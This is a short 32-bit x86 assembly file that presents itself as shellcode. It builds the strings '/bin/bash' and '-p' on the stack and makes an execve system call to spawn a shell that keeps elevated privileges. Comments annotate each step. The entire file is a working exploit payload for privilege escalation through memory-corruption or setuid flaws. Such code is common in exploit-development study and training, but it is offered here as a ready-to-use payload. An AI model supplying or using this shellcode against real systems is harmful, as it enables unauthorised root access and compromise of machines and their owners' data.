;This shellcode runs /bin/bash -p
global _start

section .text

_start:
    
    ; Set EAX and EDX to 0
    xor eax, eax
    cdq 

    ; Push 0
    push eax

    ; Push "////bin/bash"
    push 0x68736162
    push 0x2f6e6962
    push 0x2f2f2f2f
    mov ebx, esp ; "////bin/bash\0" ->  EBX

    ; Push -p\0 and save it into edi
    push eax
    mov dx, 0x702d ;-p
    push dx
    cdq ; restore edx to 0       
    mov edi, esp ; "-p\0" -> EDI
 
    ;push 0, -p\0, ////bin/bash\0 and load it into ECX
    ;   char *foo[] = { "/bin/bash", "-p", 0 };
    ;   execve("/bin/bash", foo, 0);
    push eax
    push edi
    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80
